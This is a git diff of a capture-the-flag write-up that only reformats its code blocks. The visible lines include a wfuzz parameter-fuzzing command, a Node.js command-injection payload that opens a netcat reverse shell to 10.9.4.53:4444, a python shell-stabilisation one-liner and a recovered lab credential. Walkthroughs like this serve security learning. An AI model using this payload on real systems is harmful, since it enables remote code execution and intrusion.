@@ -46,7 +46,9 @@ We see that while trying to send a post request to /api/items we get this messag
 
 Since,we are able to send POST requests.Let us search which parameters are available with wfuzz.
 
-```wfuzz -XPOST -u http://ip/api/items?FUZZ=id -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt --hh 45```
+```
+wfuzz -XPOST -u http://ip/api/items?FUZZ=id -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt --hh 45
+```
 
 ![](/images/glitch.png)
 
@@ -58,7 +60,9 @@ Now,we fire up burp and send a random request with cmd and it's working.
 
 Now,I started searching for the payload and I found one
 
-```require("child_process").exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.4.53 4444 >/tmp/f")```
+```
+require("child_process").exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.4.53 4444 >/tmp/f")
+```
 
 I changed the ip,encoded in URl form and POST this one.
 And,it worked.
@@ -69,7 +73,9 @@ Listening to the PORT we have the shell.
 
 we stabilise our shell then with,
 
-```python -c 'import pty;pty.spawn("/bin/bash")'```
+```
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
 
 Looking in the directories we get our user flag.
 
@@ -95,7 +101,9 @@ firefox --profile b5w4643p.default-release --allow-downgrade
 
 ![](/images/D4rkDemian/_glitch.png)
 
-```v0id:love_the_void```
+```
+v0id:love_the_void
+```
 
 After logging as v0id I searched for some leaks through which we can become root and I found that as **doas**
 
